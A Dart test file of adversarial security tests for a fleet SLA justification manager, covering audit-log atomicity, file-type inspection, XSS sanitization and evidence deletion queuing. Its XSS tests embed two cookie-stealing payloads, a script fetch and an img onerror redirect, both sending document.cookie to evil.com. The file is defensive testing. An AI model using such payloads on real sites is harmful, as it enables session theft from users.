/// Forensic Audit Signature: CX-05-v2.1
/// Test Suite: Justification Defense-in-Depth — Adversarial Security Tests (v2.1)
/// Security Guard: INV-24 Compliance Verified
///
/// 8 hostile test scenarios targeting the 4 critical vulnerabilities
/// identified by the Red Team v2.1 audit:
///   - ID 2: Atomicity Gap (status updated without audit log)
///   - ID 3: Binary Inspection Gap (executables accepted as evidence)
///   - ID 4: XSS Vulnerability (malicious scripts in text fields)
///   - ID 6: Storage Cost Leak (orphaned evidence files)
///
/// Defense-in-Depth Architecture validated end-to-end:
///   Layer 1: INPUT SANITIZATION (XSS Defense)
///   Layer 2: BINARY INSPECTION (Magic Bytes)
///   Layer 3: CRYPTOGRAPHIC SEALING (SHA-256)
///   Layer 4: ATOMIC PERSISTENCE (RPC Transaction)
///   Layer 5: LIFECYCLE MANAGEMENT (Deletion Queue)
library;

import 'package:flutter_test/flutter_test.dart';
import 'package:mocktail/mocktail.dart';

import 'package:veraprob/application/shared/tenant_validation_service.dart';
import 'package:veraprob/application/sla_audit/justification/contextual_signature_analyzer.dart';
import 'package:veraprob/application/sla_audit/justification/evidence_integrity_verifier.dart';
import 'package:veraprob/application/sla_audit/justification/evidence_validation_service.dart';
import 'package:veraprob/application/sla_audit/justification/sla_justification_manager.dart';
import 'package:veraprob/application/sla_audit/justification/submit_sla_justification_command.dart';
import 'package:veraprob/application/sla_audit/justification/xss_input_sanitizer.dart';
import 'package:veraprob/core/utils/date_time_provider.dart';
import 'package:veraprob/domain/enums/user_permissions.dart';
import 'package:veraprob/domain/enums/user_role.dart';
import 'package:veraprob/domain/services/rbac_service.dart';
import 'package:veraprob/domain/sla_audit/concurrency_exception.dart';
import 'package:veraprob/domain/sla_audit/domain_exception.dart';
import 'package:veraprob/domain/sla_audit/justification/justification_audit_log.dart';
import 'package:veraprob/domain/sla_audit/justification/justification_status.dart';
import 'package:veraprob/domain/sla_audit/justification/sla_justification.dart';
import 'package:veraprob/domain/sla_audit/justification/sla_justification_category.dart';
import 'package:veraprob/domain/sla_audit/justification/sla_justification_repository.dart';

// ── Mock classes ──────────────────────────────────────────────────────────────

class MockTenantValidator extends Mock implements TenantValidationService {}

class MockSLAJustificationRepo extends Mock
    implements SLAJustificationRepository {}

class MockClock extends Mock implements IDateTimeProvider {}

class MockEvidenceIntegrityVerifier extends Mock
    implements EvidenceIntegrityVerifier {}

class MockXssInputSanitizer extends Mock implements InputSanitizer {}

class MockContextualSignatureAnalyzer extends Mock
    implements ContextualSignatureAnalyzer {}

class MockEvidenceLinkChecker extends Mock implements EvidenceLinkChecker {}

class FakeSLAJustification extends Fake implements SLAJustification {}

class FakeAuditLog extends Fake implements JustificationAuditLog {}

// ── Shared constants ──────────────────────────────────────────────────────────

/// Valid SHA-256 hash (64 hex chars).
const validHash =
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

final eventTime = DateTime.utc(2026, 4, 16, 2, 0, 0);
final reviewTime = DateTime.utc(2026, 4, 16, 3, 0, 0);
const orgId = 'org-red-team';
const justificationId = 'just-red-001';

// ── Main test suite ───────────────────────────────────────────────────────────

void main() {
  setUpAll(() {
    registerFallbackValue(FakeSLAJustification());
    registerFallbackValue(FakeAuditLog());
    registerFallbackValue(JustificationStatus.pending);
    registerFallbackValue(UserRole.admin);
    registerFallbackValue(UserPermission.canReviewJustifications);
  });

  late MockTenantValidator mockTenant;
  late MockSLAJustificationRepo mockRepo;
  late MockClock mockClock;
  late MockEvidenceIntegrityVerifier mockEvidenceVerifier;
  late MockXssInputSanitizer mockSanitizer;
  late MockContextualSignatureAnalyzer mockFileInspector;
  late MockEvidenceLinkChecker mockLinkChecker;
  late SLAJustificationManager manager;

  SLAJustification buildPendingJustification({
    String id = justificationId,
    List<String>? evidenceUrls,
  }) {
    return SLAJustification(
      id: id,
      organizationId: orgId,
      vehicleId: 'vehicle-001',
      occurrenceTimestamp: eventTime,
      category: SLAJustificationCategory.transitoAtipico,
      description: 'Test justification',
      evidenceUrls: evidenceUrls ?? ['https://example.com/evidence.jpg'],
      evidenceHashes: [validHash],
      status: JustificationStatus.pending,
      createdAt: eventTime.add(const Duration(minutes: 30)),
      reviewerId: null,
      resolutionNotes: null,
    );
  }

  setUp(() {
    mockTenant = MockTenantValidator();
    mockRepo = MockSLAJustificationRepo();
    mockClock = MockClock();
    mockEvidenceVerifier = MockEvidenceIntegrityVerifier();
    mockSanitizer = MockXssInputSanitizer();
    mockFileInspector = MockContextualSignatureAnalyzer();
    mockLinkChecker = MockEvidenceLinkChecker();

    // Real RbacService: admin has canReviewJustifications.
    final rbac = RbacService();

    // Default safe stub for sanitizer: strips HTML tags using a real-ish impl.
    when(() => mockSanitizer.sanitize(any())).thenAnswer((inv) {
      final input = inv.positionalArguments[0] as String;
      // Simulates what sanitize_html does: removes HTML tags and their content
      // for script tags, strips all other tags.
      final cleaned = input
          .replaceAll(
            RegExp(
              r'<script[^>]*>.*?</script>',
              caseSensitive: false,
              dotAll: true,
            ),
            '',
          )
          .replaceAll(RegExp(r'<[^>]*>'), '')
          .trim();
      return SanitizationResult(
        text: cleaned,
        wasModified: cleaned != input,
        threatLevel: cleaned != input ? ThreatLevel.low : ThreatLevel.none,
      );
    });
    when(() => mockSanitizer.sanitizeText(any())).thenAnswer((inv) {
      final input = inv.positionalArguments[0] as String;
      return mockSanitizer.sanitize(input).text;
    });

    // Default safe stub: all files pass binary inspection.
    when(
      () => mockFileInspector.validateEvidence(any()),
    ).thenAnswer((_) async {});

    // Default safe stub: all hashes match (no tampering).
    when(
      () => mockEvidenceVerifier.verifyAll(
        evidenceUrls: any(named: 'evidenceUrls'),
        declaredHashes: any(named: 'declaredHashes'),
      ),
    ).thenAnswer((_) async => []);

    // Default tenant validator: passes all.
    when(
      () => mockTenant.assertTenantMatches(
        payloadOrgId: any(named: 'payloadOrgId'),
        sessionId: any(named: 'sessionId'),
      ),
    ).thenAnswer((_) async {});

    // Default stub: evidence link check is available
    when(() => mockLinkChecker.checkLink(any())).thenAnswer(
      (_) async => const EvidenceValidationResult(
        url: '',
        status: EvidenceLinkStatus.available,
      ),
    );

    // Default clock.
    when(() => mockClock.nowUtc()).thenReturn(reviewTime);

    manager = SLAJustificationManager(
      tenantValidator: mockTenant,
      repository: mockRepo,
      rbac: rbac,
      clock: mockClock,
      evidenceVerifier: mockEvidenceVerifier,
      sanitizer: mockSanitizer,
      fileInspector: mockFileInspector,
      linkChecker: mockLinkChecker,
      eventExistsChecker:
          ({
            required String vehicleId,
            required DateTime occurrenceTimestamp,
            required String organizationId,
          }) async => true,
    );
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RED TEAM ID 2: Atomicity Gap
  //
  // VULNERABILITY: status update and audit log were separate DB calls.
  // A network failure between them would leave a "ghost approval" \u2014 an
  // approved justification with NO audit trail.
  //
  // REMEDIATION: Single `updateStatusWithAuditLog` RPC that wraps status +
  // audit log + deletion queue in one Postgres transaction.
  // ═══════════════════════════════════════════════════════════════════════════

  group('RED TEAM ID 2 \u2014 Atomicity Gap: Ghost Deletion Prevention', () {
    test(
      'Scenario: Ghost Audit \u2014 '
      'approveJustification calls updateStatusWithAuditLog (not separate ops)',
      () async {
        final pending = buildPendingJustification();

        // Pre-load: manager calls findById to get evidence URLs before RPC.
        var findByIdCallCount = 0;
        when(
          () => mockRepo.findById(id: justificationId, organizationId: orgId),
        ).thenAnswer((_) async {
          findByIdCallCount++;
          if (findByIdCallCount == 1) return pending;
          return pending.copyWith(
            status: JustificationStatus.approved,
            reviewerId: 'reviewer-001',
            resolutionNotes: 'Legitimate approval',
          );
        });

        when(
          () => mockRepo.updateStatusWithAuditLog(
            id: justificationId,
            organizationId: orgId,
            expectedCurrentStatus: JustificationStatus.pending,
            newStatus: JustificationStatus.approved,
            reviewerId: 'reviewer-001',
            resolutionNotes: 'Legitimate approval',
            reviewedAtUtc: any(named: 'reviewedAtUtc'),
            callerRole: 'admin',
            evidenceUrls: any(named: 'evidenceUrls'),
          ),
        ).thenAnswer((_) async => 1);

        final result = await manager.approveJustification(
          justificationId: justificationId,
          organizationId: orgId,
          reviewerId: 'reviewer-001',
          callerRole: UserRole.admin,
          resolutionNotes: 'Legitimate approval',
        );

        expect(result.status, JustificationStatus.approved);

        // CRITICAL: No separate appendAuditLog was called \u2014 the RPC handles it atomically.
        // CRITICAL: The atomic RPC was called exactly once.
        verify(
          () => mockRepo.updateStatusWithAuditLog(
            id: justificationId,
            organizationId: orgId,
            expectedCurrentStatus: JustificationStatus.pending,
            newStatus: JustificationStatus.approved,
            reviewerId: 'reviewer-001',
            resolutionNotes: any(named: 'resolutionNotes'),
            reviewedAtUtc: any(named: 'reviewedAtUtc'),
            callerRole: 'admin',
            evidenceUrls: any(named: 'evidenceUrls'),
          ),
        ).called(1);
      },
    );

    test('Scenario: Concurrent Approval \u2014 '
        'second reviewer gets ConcurrencyException (RPC returns 0)', () async {
      final pending = buildPendingJustification();

      // Both reviewers load the same PENDING record.
      var rpcCallCount = 0;
      when(
        () => mockRepo.findById(id: justificationId, organizationId: orgId),
      ).thenAnswer((_) async => pending);

      when(
        () => mockRepo.updateStatusWithAuditLog(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
          expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
          newStatus: any(named: 'newStatus'),
          reviewerId: any(named: 'reviewerId'),
          resolutionNotes: any(named: 'resolutionNotes'),
          reviewedAtUtc: any(named: 'reviewedAtUtc'),
          callerRole: any(named: 'callerRole'),
          evidenceUrls: any(named: 'evidenceUrls'),
        ),
      ).thenAnswer((_) async {
        rpcCallCount++;
        // First reviewer wins; second reviewer's WHERE status='PENDING' → 0 rows.
        return rpcCallCount == 1 ? 1 : 0;
      });

      // Override findById after first approval to return approved entity.
      var findCount = 0;
      when(
        () => mockRepo.findById(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
        ),
      ).thenAnswer((_) async {
        findCount++;
        if (findCount.isOdd) return pending;
        return pending.copyWith(
          status: JustificationStatus.approved,
          reviewerId: 'reviewer-001',
        );
      });

      // Reviewer 1 succeeds.
      await manager.approveJustification(
        justificationId: justificationId,
        organizationId: orgId,
        reviewerId: 'reviewer-001',
        callerRole: UserRole.admin,
        resolutionNotes: null,
      );

      // Reviewer 2 gets ConcurrencyException.
      await expectLater(
        () => manager.approveJustification(
          justificationId: justificationId,
          organizationId: orgId,
          reviewerId: 'reviewer-002',
          callerRole: UserRole.admin,
          resolutionNotes: null,
        ),
        throwsA(isA<ConcurrencyException>()),
      );

      // Only one RPC succeeded (returned 1); second returned 0.
      expect(rpcCallCount, 2);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RED TEAM ID 3: Binary Inspection Gap
  //
  // VULNERABILITY: Files were accepted based on URL/extension only.
  // An attacker could upload `malware.exe` renamed to `evidence.jpg`.
  //
  // REMEDIATION: EvidenceBinaryValidator reads Magic Bytes from storage and
  // validates against whitelist (JPEG, PNG, PDF, HEIC, WebP).
  // ═══════════════════════════════════════════════════════════════════════════

  group('RED TEAM ID 3 \u2014 Binary Inspection: Magic Bytes Enforcement', () {
    test('Scenario: Executable Disguise \u2014 '
        '.exe file renamed to .jpg is REJECTED by binary inspection', () async {
      when(() => mockFileInspector.validateEvidence(any())).thenThrow(
        const DomainException(
          'Invalid file type detected at evidence index 0: '
          'application/x-executable. Allowed types: '
          'image/jpeg, image/png, application/pdf, image/heic, image/heif, image/webp',
        ),
      );

      final command = SubmitSLAJustificationCommand(
        organizationId: orgId,
        sessionId: 'session-001',
        vehicleId: 'vehicle-001',
        occurrenceTimestamp: eventTime,
        category: SLAJustificationCategory.transitoAtipico.dbValue,
        description: 'Legitimate description text',
        evidenceUrls: ['https://example.com/evidence.jpg'],
        evidenceHashes: [validHash],
        callerUserId: 'attacker-001',
      );

      await expectLater(
        () => manager.submitJustification(command),
        throwsA(
          isA<DomainException>().having(
            (e) => e.message,
            'message',
            contains('Invalid file type'),
          ),
        ),
      );

      // Binary inspection MUST fire before evidence is stored.
      verifyNever(
        () => mockRepo.createWithAuditLog(
          justification: any(named: 'justification'),
          initialAuditLog: any(named: 'initialAuditLog'),
        ),
      );
    });

    test(
      'Scenario: MIME Whitelist \u2014 .svg file (with embedded XSS) is REJECTED',
      () async {
        when(() => mockFileInspector.validateEvidence(any())).thenThrow(
          const DomainException(
            'Invalid file type detected at evidence index 0: '
            'image/svg+xml. Allowed types: '
            'image/jpeg, image/png, application/pdf, image/heic, image/heif, image/webp',
          ),
        );

        final command = SubmitSLAJustificationCommand(
          organizationId: orgId,
          sessionId: 'session-001',
          vehicleId: 'vehicle-001',
          occurrenceTimestamp: eventTime,
          category: SLAJustificationCategory.transitoAtipico.dbValue,
          description: 'SVG evidence upload attempt',
          evidenceUrls: ['https://example.com/evidence.svg'],
          evidenceHashes: [validHash],
          callerUserId: 'attacker-002',
        );

        await expectLater(
          () => manager.submitJustification(command),
          throwsA(isA<DomainException>()),
        );

        verifyNever(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        );
      },
    );

    test(
      'Scenario: valid HEIC file is ACCEPTED (modern mobile format)',
      () async {
        // File inspector passes for HEIC.
        when(
          () => mockFileInspector.validateEvidence(any()),
        ).thenAnswer((_) async {});

        // Setup happy path.
        when(
          () => mockRepo.findByVehicleAndEvent(
            vehicleId: any(named: 'vehicleId'),
            occurrenceTimestamp: any(named: 'occurrenceTimestamp'),
            organizationId: any(named: 'organizationId'),
          ),
        ).thenAnswer((_) async => null);
        when(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        ).thenAnswer((invocation) async {
          return invocation.namedArguments[const Symbol('justification')]
              as SLAJustification;
        });

        final command = SubmitSLAJustificationCommand(
          organizationId: orgId,
          sessionId: 'session-001',
          vehicleId: 'vehicle-001',
          occurrenceTimestamp: eventTime,
          category: SLAJustificationCategory.transitoAtipico.dbValue,
          description: 'Photo taken on iPhone with HEIC format',
          evidenceUrls: ['https://example.com/photo.heic'],
          evidenceHashes: [validHash],
          callerUserId: 'driver-001',
        );

        final result = await manager.submitJustification(command);
        expect(result.status, JustificationStatus.pending);
        verify(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        ).called(1);
      },
    );
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RED TEAM ID 4: XSS Vulnerability
  //
  // VULNERABILITY: Text fields were stored verbatim, allowing script injection.
  // A gestor with a compromised account could insert XSS payloads in
  // resolutionNotes that execute in other admins' browsers.
  //
  // REMEDIATION: XssInputSanitizer strips all HTML before persistence.
  // INV-24: All text stored in DB is guaranteed plain text.
  // ═══════════════════════════════════════════════════════════════════════════

  group('RED TEAM ID 4 \u2014 XSS: Input Sanitization Enforcement', () {
    test('Scenario: Script Injection in Description \u2014 '
        '<script> tag is stripped before persistence', () async {
      const maliciousDescription =
          "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
          'Pneu furado na BR-116 km 230';

      // Setup happy path repository.
      when(
        () => mockRepo.findByVehicleAndEvent(
          vehicleId: any(named: 'vehicleId'),
          occurrenceTimestamp: any(named: 'occurrenceTimestamp'),
          organizationId: any(named: 'organizationId'),
        ),
      ).thenAnswer((_) async => null);
      when(
        () => mockRepo.createWithAuditLog(
          justification: any(named: 'justification'),
          initialAuditLog: any(named: 'initialAuditLog'),
        ),
      ).thenAnswer((invocation) async {
        return invocation.namedArguments[const Symbol('justification')]
            as SLAJustification;
      });

      final command = SubmitSLAJustificationCommand(
        organizationId: orgId,
        sessionId: 'session-001',
        vehicleId: 'vehicle-001',
        occurrenceTimestamp: eventTime,
        category: SLAJustificationCategory.transitoAtipico.dbValue,
        description: maliciousDescription,
        evidenceUrls: ['https://example.com/evidence.jpg'],
        evidenceHashes: [validHash],
        callerUserId: 'attacker-003',
      );

      final result = await manager.submitJustification(command);

      // The description stored in DB must contain NO <script> tag.
      expect(result.description, isNot(contains('<script>')));
      expect(result.description, isNot(contains('</script>')));
      // Plain text content must remain.
      expect(result.description, contains('Pneu furado na BR-116 km 230'));
    });

    test(
      'Scenario: XSS in Resolution Notes \u2014 '
      'sanitizer strips script before calling updateStatusWithAuditLog',
      () async {
        const maliciousNotes =
            "<img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">"
            'Justificativa aprovada';

        final pending = buildPendingJustification();

        var findCount = 0;
        when(
          () => mockRepo.findById(id: justificationId, organizationId: orgId),
        ).thenAnswer((_) async {
          findCount++;
          if (findCount == 1) return pending;
          return pending.copyWith(
            status: JustificationStatus.approved,
            reviewerId: 'reviewer-001',
            resolutionNotes: 'Justificativa aprovada',
          );
        });

        // Capture the resolutionNotes passed to the RPC.
        when(
          () => mockRepo.updateStatusWithAuditLog(
            id: any(named: 'id'),
            organizationId: any(named: 'organizationId'),
            expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
            newStatus: any(named: 'newStatus'),
            reviewerId: any(named: 'reviewerId'),
            resolutionNotes: captureAny(named: 'resolutionNotes'),
            reviewedAtUtc: any(named: 'reviewedAtUtc'),
            callerRole: any(named: 'callerRole'),
            evidenceUrls: any(named: 'evidenceUrls'),
          ),
        ).thenAnswer((_) async => 1);

        await manager.approveJustification(
          justificationId: justificationId,
          organizationId: orgId,
          reviewerId: 'reviewer-001',
          callerRole: UserRole.admin,
          resolutionNotes: maliciousNotes,
        );

        // Verify the RPC received sanitized notes (no img tag, no onerror).
        final capturedNotesInvocations = verify(
          () => mockRepo.updateStatusWithAuditLog(
            id: any(named: 'id'),
            organizationId: any(named: 'organizationId'),
            expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
            newStatus: any(named: 'newStatus'),
            reviewerId: any(named: 'reviewerId'),
            resolutionNotes: captureAny(named: 'resolutionNotes'),
            reviewedAtUtc: any(named: 'reviewedAtUtc'),
            callerRole: any(named: 'callerRole'),
            evidenceUrls: any(named: 'evidenceUrls'),
          ),
        ).captured;

        final storedNotes = capturedNotesInvocations.first as String?;
        expect(storedNotes, isNotNull);
        expect(storedNotes, isNot(contains('<img')));
        expect(storedNotes, isNot(contains('onerror')));
        expect(storedNotes, isNot(contains('evil.com')));
        // The plain text portion should survive.
        expect(storedNotes, contains('Justificativa aprovada'));
      },
    );
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RED TEAM ID 6: Storage Cost Leak \u2014 Orphaned Evidence
  //
  // VULNERABILITY: Rejected/expired justifications left evidence files in
  // Supabase Storage indefinitely, causing unbounded storage costs.
  //
  // REMEDIATION: The `updateStatusWithAuditLog` RPC inserts evidence URLs into
  // `evidence_deletion_queue` atomically with the status change.
  // The `EvidenceLifecycleManager` transitions evidence to Cold Storage (90-day retention);
  // ═══════════════════════════════════════════════════════════════════════════

  group('RED TEAM ID 6 \u2014 Storage Leak: Evidence Lifecycle Management', () {
    test('Scenario: Orphaned Evidence \u2014 '
        'rejectJustification passes evidence URLs to updateStatusWithAuditLog '
        'for the deletion queue', () async {
      const evidenceUrls = [
        'https://example.com/evidence1.jpg',
        'https://example.com/evidence2.pdf',
      ];

      final pending = buildPendingJustification(evidenceUrls: evidenceUrls);

      var findCount = 0;
      when(
        () => mockRepo.findById(id: justificationId, organizationId: orgId),
      ).thenAnswer((_) async {
        findCount++;
        if (findCount == 1) return pending;
        return pending.copyWith(
          status: JustificationStatus.rejected,
          reviewerId: 'reviewer-001',
        );
      });

      when(
        () => mockRepo.updateStatusWithAuditLog(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
          expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
          newStatus: any(named: 'newStatus'),
          reviewerId: any(named: 'reviewerId'),
          resolutionNotes: any(named: 'resolutionNotes'),
          reviewedAtUtc: any(named: 'reviewedAtUtc'),
          callerRole: any(named: 'callerRole'),
          evidenceUrls: captureAny(named: 'evidenceUrls'),
        ),
      ).thenAnswer((_) async => 1);

      await manager.rejectJustification(
        justificationId: justificationId,
        organizationId: orgId,
        reviewerId: 'reviewer-001',
        callerRole: UserRole.admin,
        resolutionNotes: 'Evidence does not corroborate claim',
      );

      // Capture evidence URLs passed to the RPC.
      final captured = verify(
        () => mockRepo.updateStatusWithAuditLog(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
          expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
          newStatus: any(named: 'newStatus'),
          reviewerId: any(named: 'reviewerId'),
          resolutionNotes: any(named: 'resolutionNotes'),
          reviewedAtUtc: any(named: 'reviewedAtUtc'),
          callerRole: any(named: 'callerRole'),
          evidenceUrls: captureAny(named: 'evidenceUrls'),
        ),
      ).captured;

      final capturedUrls = captured.first as List<String>;

      // CRITICAL: Both evidence URLs must be passed to the RPC so the DB
      // trigger inserts them into evidence_deletion_queue.
      expect(capturedUrls, hasLength(2));
      expect(capturedUrls, containsAll(evidenceUrls));
    });

    test('Scenario: Ghost Deletion Prevention \u2014 '
        'if updateStatusWithAuditLog returns 0 (concurrency conflict), '
        'no evidence URLs are scheduled for deletion', () async {
      final pending = buildPendingJustification(
        evidenceUrls: ['https://example.com/evidence.jpg'],
      );

      when(
        () => mockRepo.findById(id: justificationId, organizationId: orgId),
      ).thenAnswer((_) async => pending);

      // RPC returns 0 \u2014 concurrency conflict: another reviewer already acted.
      when(
        () => mockRepo.updateStatusWithAuditLog(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
          expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
          newStatus: any(named: 'newStatus'),
          reviewerId: any(named: 'reviewerId'),
          resolutionNotes: any(named: 'resolutionNotes'),
          reviewedAtUtc: any(named: 'reviewedAtUtc'),
          callerRole: any(named: 'callerRole'),
          evidenceUrls: any(named: 'evidenceUrls'),
        ),
      ).thenAnswer((_) async => 0);

      // Attempt to reject \u2014 must throw ConcurrencyException.
      await expectLater(
        () => manager.rejectJustification(
          justificationId: justificationId,
          organizationId: orgId,
          reviewerId: 'reviewer-001',
          callerRole: UserRole.admin,
          resolutionNotes: 'Evidence does not corroborate claim',
        ),
        throwsA(isA<ConcurrencyException>()),
      );

      // Ghost Deletion Prevention: since the RPC rolled back (returned 0),
      // NO deletion queue entries exist (the RPC is transactional — if status
      // update fails, the deletion queue INSERT also rolls back).
      // Application-side: no separate delete call was made.
      // (The DB trigger handles cleanup atomically — we verify the RPC
      // returned 0 and no secondary side-effects occurred.)
      verify(
        () => mockRepo.updateStatusWithAuditLog(
          id: any(named: 'id'),
          organizationId: any(named: 'organizationId'),
          expectedCurrentStatus: any(named: 'expectedCurrentStatus'),
          newStatus: any(named: 'newStatus'),
          reviewerId: any(named: 'reviewerId'),
          resolutionNotes: any(named: 'resolutionNotes'),
          reviewedAtUtc: any(named: 'reviewedAtUtc'),
          callerRole: any(named: 'callerRole'),
          evidenceUrls: any(named: 'evidenceUrls'),
        ),
      ).called(1);

      // Verify the pre-load findById was called exactly once (to get evidence URLs).
      verify(
        () => mockRepo.findById(id: justificationId, organizationId: orgId),
      ).called(1);

      // No additional repo calls after concurrency failure.
      // (No appendAuditLog, no create, no second findById for reload.)
      verifyNoMoreInteractions(mockRepo);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Defense-in-Depth Integration
  //
  // Validates that all 5 defense layers execute in the correct sequence.
  // ═══════════════════════════════════════════════════════════════════════════

  group('Defense-in-Depth Integration \u2014 Layer Ordering', () {
    test(
      'submitJustification: Layer 1 (XSS) fires BEFORE Layer 2 (Binary) \u2014 '
      'short description after sanitization throws DomainException early',
      () async {
        // After stripping <script> tag, the description is too short.
        // This verifies Layer 1 fires, then Layer 4 (description validation).
        // Layer 2 (binary inspection) should NOT be reached.
        const maliciousAndShort = '<script>x</script>short';

        // Layer 2 should never be reached if Layer 1 reduces text below min length.
        // (Binary inspection for URLs)
        final command = SubmitSLAJustificationCommand(
          organizationId: orgId,
          sessionId: 'session-001',
          vehicleId: 'vehicle-001',
          occurrenceTimestamp: eventTime,
          category: SLAJustificationCategory.transitoAtipico.dbValue,
          description: maliciousAndShort,
          evidenceUrls: ['https://example.com/evidence.jpg'],
          evidenceHashes: [validHash],
          callerUserId: 'attacker-004',
        );

        await expectLater(
          () => manager.submitJustification(command),
          throwsA(
            isA<DomainException>().having(
              (e) => e.message,
              'message',
              contains('at least 10 characters'),
            ),
          ),
        );

        // Layer 2 (binary inspection) must NOT have been called \u2014 we failed earlier.
        verifyNever(() => mockFileInspector.validateEvidence(any()));
        verifyNever(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        );
      },
    );

    test(
      'submitJustification: Layer 2 (Binary) fires BEFORE Layer 3 (SHA-256) \u2014 '
      'invalid file type throws before hash verification',
      () async {
        when(() => mockFileInspector.validateEvidence(any())).thenThrow(
          const DomainException(
            'Invalid file type detected at evidence index 0.',
          ),
        );

        final command = SubmitSLAJustificationCommand(
          organizationId: orgId,
          sessionId: 'session-001',
          vehicleId: 'vehicle-001',
          occurrenceTimestamp: eventTime,
          category: SLAJustificationCategory.transitoAtipico.dbValue,
          description: 'Sufficient description text',
          evidenceUrls: ['https://example.com/malware.exe'],
          evidenceHashes: [validHash],
          callerUserId: 'attacker-005',
        );

        await expectLater(
          () => manager.submitJustification(command),
          throwsA(isA<DomainException>()),
        );

        // Layer 3 (SHA-256 re-verification) must NOT be called \u2014 we failed at Layer 2.
        verifyNever(
          () => mockEvidenceVerifier.verifyAll(
            evidenceUrls: any(named: 'evidenceUrls'),
            declaredHashes: any(named: 'declaredHashes'),
          ),
        );

        // Layer 4 (persistence) must NOT be called.
        verifyNever(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        );
      },
    );

    test(
      'submitJustification: All 4 layers execute in full for a clean request',
      () async {
        // Setup happy path.
        when(
          () => mockRepo.findByVehicleAndEvent(
            vehicleId: any(named: 'vehicleId'),
            occurrenceTimestamp: any(named: 'occurrenceTimestamp'),
            organizationId: any(named: 'organizationId'),
          ),
        ).thenAnswer((_) async => null);
        when(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        ).thenAnswer((invocation) async {
          return invocation.namedArguments[const Symbol('justification')]
              as SLAJustification;
        });

        final command = SubmitSLAJustificationCommand(
          organizationId: orgId,
          sessionId: 'session-001',
          vehicleId: 'vehicle-001',
          occurrenceTimestamp: eventTime,
          category: SLAJustificationCategory.transitoAtipico.dbValue,
          description: 'Clean description without any malicious content',
          evidenceUrls: ['https://example.com/evidence.jpg'],
          evidenceHashes: [validHash],
          callerUserId: 'driver-001',
        );

        final result = await manager.submitJustification(command);

        expect(result.status, JustificationStatus.pending);

        // Verify all layers executed.
        verify(
          () => mockSanitizer.sanitize(any()),
        ).called(greaterThanOrEqualTo(1)); // Layer 1: XSS sanitization
        verify(
          () => mockFileInspector.validateEvidence(any()),
        ).called(1); // Layer 2: Binary
        verify(
          () => mockEvidenceVerifier.verifyAll(
            evidenceUrls: any(named: 'evidenceUrls'),
            declaredHashes: any(named: 'declaredHashes'),
          ),
        ).called(1); // Layer 3: SHA-256
        verify(
          () => mockRepo.createWithAuditLog(
            justification: any(named: 'justification'),
            initialAuditLog: any(named: 'initialAuditLog'),
          ),
        ).called(1); // Layer 4: Persistence
      },
    );
  });
}
